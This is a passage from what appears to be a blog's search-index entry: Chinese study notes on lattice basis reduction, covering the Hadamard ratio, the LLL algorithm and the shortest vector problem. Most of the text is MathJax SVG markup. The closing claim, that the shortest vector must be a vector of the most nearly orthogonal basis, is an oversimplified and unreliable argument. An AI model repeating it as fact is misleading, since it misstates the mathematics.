-249H139Z"/></g><g data-mml-node="mo" transform="translate(6532.5,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"/></g><g data-mml-node="mo" transform="translate(7588.3,0)"><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z"/><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(556,0)"/><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(1000,0)"/></g><g data-mml-node="mo" transform="translate(8977.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(9366.3,0)"><path data-c="1D473" d="M258 624H235Q214 624 209 626T199 639Q203 678 216 684Q220 686 239 686Q290 684 409 684Q454 684 492 684T552 685T579 686Q603 686 603 668Q599 632 587 626Q583 624 520 624H457L388 344Q317 64 317 63T353 62H390Q418 62 440 64T493 78T548 110T598 169T643 261Q651 282 655 285T680 289Q696 289 700 288T709 279Q711 274 711 269Q710 265 663 138T613 8Q611 4 602 0H58Q47 5 43 15Q47 54 60 60Q64 62 113 62H162L302 623Q302 624 258 624Z"/></g><g data-mml-node="mo" transform="translate(10122.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">  </font></p>
<p><font style="color:rgb(0, 0, 0);">此时我们引入Hadamard比率，定义为</font></p>
<p><font style="color:rgb(0, 0, 0);">                                                     </font><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.469ex;" xmlns="http://www.w3.org/2000/svg" width="24.093ex" height="4.652ex" role="img" focusable="false" viewbox="0 -1406.9 10649 2056.4"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="48" d="M18 487Q18 496 29 517T67 566T127 621T216 665T330 683Q359 683 376 669T397 643T400 622Q400 584 382 488T348 343Q348 342 467 342H587L594 366Q615 440 648 534T690 641Q701 656 723 669T764 683Q783 683 783 672L750 578Q716 485 677 346T625 101Q624 92 623 82T622 65T621 56Q621 20 658 20Q666 20 701 25Q709 52 736 69T785 87Q803 87 803 75T791 44T754 3T685 -33T588 -48Q568 -48 562 -46Q522 -31 522 13V23Q531 129 562 250L569 281L565 280Q561 278 556 277T549 274L438 273H328L321 249Q307 202 275 107T232 0Q219 -16 196 -28T155 -41Q149 -41 145 -39T140 -34T139 -29Q139 -24 148 -3T181 86T233 247Q240 270 240 272Q240 273 194 273H169Q139 273 139 285Q139 295 153 308T187 332Q206 341 236 342L260 343L264 359Q278 414 289 482T300 578Q300 613 260 613H254Q198 613 169 592Q148 578 127 544T104 508Q72 478 37 475Q18 475 18 487Z"/></g></g><g data-mml-node="mo" transform="translate(845,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1234,0)"><g data-mml-node="mi"><path data-c="42" d="M304 342Q292 342 292 353Q292 372 323 391Q331 396 417 428T533 487Q563 512 563 555V562Q563 575 557 589T530 618T475 636Q429 636 396 613T330 539Q263 446 210 238Q196 183 173 120Q135 31 121 16Q108 1 85 -10T47 -22T32 -10Q32 -5 44 18T77 93T112 206Q135 296 154 395T182 550T191 615Q191 616 190 616Q188 616 179 611T157 601T131 594Q113 594 113 605Q113 623 144 644Q154 650 205 676T267 703Q277 705 279 705Q295 705 295 693Q295 686 288 635T278 575Q278 572 287 582Q336 635 402 669T540 704Q603 704 633 673T664 599Q664 559 638 523T580 462Q553 440 504 413L491 407L504 402Q566 381 596 338T627 244Q627 172 575 110T444 13T284 -22Q208 -22 158 28Q144 42 146 50Q150 67 178 85T230 103Q236 103 246 95T267 75T302 56T357 47Q436 47 486 93Q526 136 526 198V210Q526 228 518 249T491 292T436 330T350 345Q335 345 321 344T304 342Z"/></g></g><g data-mml-node="mo" transform="translate(1891,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(2557.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="msup" transform="translate(3613.6,0)"><g data-mml-node="mrow"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="28" d="M180 96T180 250T205 541T266 770T353 944T444 1069T527 1150H555Q561 1144 561 1141Q561 1137 545 1120T504 1072T447 995T386 878T330 721T288 513T272 251Q272 133 280 56Q293 -87 326 -209T399 -405T475 -531T536 -609T561 -640Q561 -643 555 -649H527Q483 -612 443 -568T353 -443T266 -270T205 -41Z"/></g><g data-mml-node="mfrac" transform="translate(597,0)"><g data-mml-node="mrow" transform="translate(1280.1,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z"/><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(556,0)"/><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(1000,0)"/></g><g data-mml-node="mo" transform="translate(1389,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(1778,0)"><path data-c="1D473" d="M258 624H235Q214 624 209 626T199 639Q203 678 216 684Q220 686 239 686Q290 684 409 684Q454 684 492 684T552 685T579 686Q603 686 603 668Q599 632 587 626Q583 624 520 624H457L388 344Q317 64 317 63T353 62H390Q418 62 440 64T493 78T548 110T598 169T643 261Q651 282 655 285T680 289Q696 289 700 288T709 279Q711 274 711 269Q710 265 663 138T613 8Q611 4 602 0H58Q47 5 43 15Q47 54 60 60Q64 62 113 62H162L302 623Q302 624 258 624Z"/></g><g data-mml-node="mo" transform="translate(2534,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g><g data-mml-node="mrow" transform="translate(220,-370) scale(0.707)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mn" transform="translate(600,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g><g data-mml-node="mo" transform="translate(1281.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mo" transform="translate(1559.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="msub" transform="translate(1837.6,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mn" transform="translate(600,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g></g><g data-mml-node="mo" transform="translate(2841.1,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mo" transform="translate(3119.1,0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"/></g><g data-mml-node="mo" transform="translate(4291.1,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="msub" transform="translate(4569.1,0)"><g data-mml-node="mi"><path data-c="1D497" d="M380 367Q380 397 406 425T465 453Q493 453 516 430T540 357Q540 314 524 250T467 115T373 13Q338 -8 292 -8Q218 -8 167 23T116 129Q116 178 152 275T189 388Q189 396 187 398T176 401Q148 398 125 372T89 304Q84 288 81 285T61 282H55H44Q24 282 24 296Q24 306 34 330T64 382T116 431T189 452Q231 452 269 429T308 362Q308 346 273 255T238 114Q238 43 306 43Q336 43 363 65T407 118T437 182T456 239T462 268Q462 290 417 315Q380 335 380 367Z"/></g><g data-mml-node="mi" transform="translate(600,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(5643.4,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g></g><rect width="4387" height="60" x="120" y="220"/></g><g data-mml-node="mo" transform="translate(5224,0) translate(0 -0.5)"><path data-c="29" d="M35 1138Q35 1150 51 1150H56H69Q113 1113 153 1069T243 944T330 771T391 541T416 250T391 -40T330 -270T243 -443T152 -568T69 -649H56Q43 -649 39 -647T35 -637Q65 -607 110 -548Q283 -316 316 56Q324 133 324 251Q324 368 316 445Q278 877 48 1123Q36 1137 35 1138Z"/></g></g><g data-mml-node="TeXAtom" transform="translate(5854,876.6) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(500,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"/></g></g><g data-mml-node="mi" transform="translate(1000,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g></g></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);"> </font></p>
<p>当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.158ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2280 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="48" d="M18 487Q18 496 29 517T67 566T127 621T216 665T330 683Q359 683 376 669T397 643T400 622Q400 584 382 488T348 343Q348 342 467 342H587L594 366Q615 440 648 534T690 641Q701 656 723 669T764 683Q783 683 783 672L750 578Q716 485 677 346T625 101Q624 92 623 82T622 65T621 56Q621 20 658 20Q666 20 701 25Q709 52 736 69T785 87Q803 87 803 75T791 44T754 3T685 -33T588 -48Q568 -48 562 -46Q522 -31 522 13V23Q531 129 562 250L569 281L565 280Q561 278 556 277T549 274L438 273H328L321 249Q307 202 275 107T232 0Q219 -16 196 -28T155 -41Q149 -41 145 -39T140 -34T139 -29Q139 -24 148 -3T181 86T233 247Q240 270 240 272Q240 273 194 273H169Q139 273 139 285Q139 295 153 308T187 332Q206 341 236 342L260 343L264 359Q278 414 289 482T300 578Q300 613 260 613H254Q198 613 169 592Q148 578 127 544T104 508Q72 478 37 475Q18 475 18 487Z"/></g></g><g data-mml-node="mo" transform="translate(845,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1234,0)"><g data-mml-node="mi"><path data-c="42" d="M304 342Q292 342 292 353Q292 372 323 391Q331 396 417 428T533 487Q563 512 563 555V562Q563 575 557 589T530 618T475 636Q429 636 396 613T330 539Q263 446 210 238Q196 183 173 120Q135 31 121 16Q108 1 85 -10T47 -22T32 -10Q32 -5 44 18T77 93T112 206Q135 296 154 395T182 550T191 615Q191 616 190 616Q188 616 179 611T157 601T131 594Q113 594 113 605Q113 623 144 644Q154 650 205 676T267 703Q277 705 279 705Q295 705 295 693Q295 686 288 635T278 575Q278 572 287 582Q336 635 402 669T540 704Q603 704 633 673T664 599Q664 559 638 523T580 462Q553 440 504 413L491 407L504 402Q566 381 596 338T627 244Q627 172 575 110T444 13T284 -22Q208 -22 158 28Q144 42 146 50Q150 67 178 85T230 103Q236 103 246 95T267 75T302 56T357 47Q436 47 486 93Q526 136 526 198V210Q526 228 518 249T491 292T436 330T350 345Q335 345 321 344T304 342Z"/></g></g><g data-mml-node="mo" transform="translate(1891,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container><font style="color:rgb(0, 0, 0);">越接近1，则这组基向量越接近正交基。</font></p>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<p><font style="color:rgb(0, 0, 0);">那么对于格基规约来说，我们希望找到越接近正交基的基向量越好，这里我们可以通过LLL算法来找到这组基</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/47928994/1743037058584-2787a842-a3e0-4057-bee6-5b066ff45efb.png"></p>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<p><strong><font style="color:rgb(0, 0, 0);">这组基和SVP有什么联系？</font></strong></p>
<p><font style="color:rgb(0, 0, 0);">假设我们找到了一组正交基或者说最接近正交基的基。</font></p>
<p><font style="color:rgb(0, 0, 0);">对于最短向量 </font><strong><font style="color:rgb(0, 0, 0);">v</font></strong><em><strong><font style="color:rgb(0, 0, 0);"> </font></strong></em><font style="color:rgb(0, 0, 0);">来说，它和这组基之间的关系有两种可能：</font></p>
<ol>
<li><font style="color:rgb(0, 0, 0);">假设 </font><strong><font style="color:rgb(0, 0, 0);">v</font></strong><em><strong><font style="color:rgb(0, 0, 0);"> </font></strong></em><font style="color:rgb(0, 0, 0);">是这个基中的某个向量，显然此时该向量在其他向量上的投影长度都为0（因为两两垂直），符合SVP的要求。</font></li>
<li><font style="color:rgb(0, 0, 0);">假设 </font><strong><font style="color:rgb(0, 0, 0);">v </font></strong><font style="color:rgb(0, 0, 0);">不是基中的向量，显然我们发现此时该向量一定可以通过在其他基向量方向的投影来得到一个更短的向量。</font></li>
</ol>
<p><font style="color:rgb(0, 0, 0);"></font></p>
<p><font style="color:rgb(0, 0, 0);">所以SVP的解一定是最接近正交基的基向量。</font></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
</search>
